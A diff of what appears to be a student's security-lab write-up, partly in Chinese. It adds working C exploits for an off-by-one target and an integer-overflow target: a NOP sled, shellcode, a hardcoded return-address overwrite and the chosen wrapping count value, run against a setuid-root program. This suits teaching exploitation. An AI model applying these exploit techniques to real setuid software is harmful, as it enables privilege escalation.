@@ -3,6 +3,7 @@
 - [Proj1](#proj1)
     + [Target1 Buffer overflow](#target1-buffer-overflow)
     + [Target2 Off-by-one](#target2-off-by-one)
+    + [Target3 Integer overflow](#target3-integer-overflow)
 
 # Proj1
 ## Target1 Buffer overflow
@@ -146,6 +147,88 @@ int main(void)
   *(int *) (sploitstring + offset) = 0xffffffff;
   *(int *) (sploitstring + offset + 4) = 0xbffffd00 + 4 + 4;
   memcpy(sploitstring + offset + 4 + 4, shellcode, strlen(shellcode)); 
+
+  char *args[] = { TARGET, sploitstring, NULL };
+  char *env[] = { NULL };
+
+  execve(TARGET, args, env);
+  fprintf(stderr, "execve failed.\n");
+
+  return 0;
+}
+```
+## Target3 Integer overflow
+```c
+struct widget_t {
+  double x;
+  double y;
+  int count;
+};
+
+#define MAX_WIDGETS 1000
+
+int foo(char *in, int count)
+{
+  struct widget_t buf[MAX_WIDGETS];
+
+  if (count < MAX_WIDGETS) 
+    memcpy(buf, in, count * sizeof(struct widget_t));
+
+  return 0;
+}
+
+int main(int argc, char *argv[])
+{
+  int count;
+  char *in;
+
+  if (argc != 2)
+    {
+      fprintf(stderr, "target3: argc != 2\n");
+      exit(EXIT_FAILURE);
+    }
+  setuid(0);
+
+  /*
+   * format of argv[1] is as follows:
+   *
+   * - a count, encoded as a decimal number in ASCII
+   * - a comma (",")
+   * - the remainder of the data, treated as an array
+   *   of struct widget_t
+   */
+
+  count = (int)strtoul(argv[1], &in, 10);
+  if (*in != ',')
+    {
+      fprintf(stderr, "target3: argument format is [count],[data]\n");
+      exit(EXIT_FAILURE);
+    }
+  in++;                         /* advance one byte, past the comma */
+  foo(in, count);
+
+  return 0;
+}
+```
+关键的是要满足以下几个条件，有符号的count要小于1000，无符号的要满足**(20 * count) mod (2^32)略大于20000**，但是又不能太大，否则会seg fault，这里取`count=2147484649`，所以`(20 * 2147484649) mod 2^32 = 20020`，插入shellcode然后修改return地址即可
+```c
+if (count < MAX_WIDGETS) 
+    memcpy(buf, in, count * sizeof(struct widget_t));
+```
+```c
+int main(void)
+{
+
+  char sploitstring[1000 * (2 * sizeof(double) + sizeof(int)) + 4 + 11];
+  memset(sploitstring, '\x90', sizeof(sploitstring));
+  // sizeof(struct widget_t) = 20
+  // (20 * count) mod 2^32 = 1000 * 20 + 4 + 1
+  // (int) count < 0
+  // printf("%zu\n", 2147484649*20)=20020
+  char *countstring = "2147484649,";
+  memcpy(sploitstring, countstring, strlen(countstring));
+  memcpy(sploitstring + 40, shellcode, strlen(shellcode));
+  *(int *)(sploitstring + 20000 + strlen(countstring) + 4) = 0xbfff6210;
 
   char *args[] = { TARGET, sploitstring, NULL };
   char *env[] = { NULL };
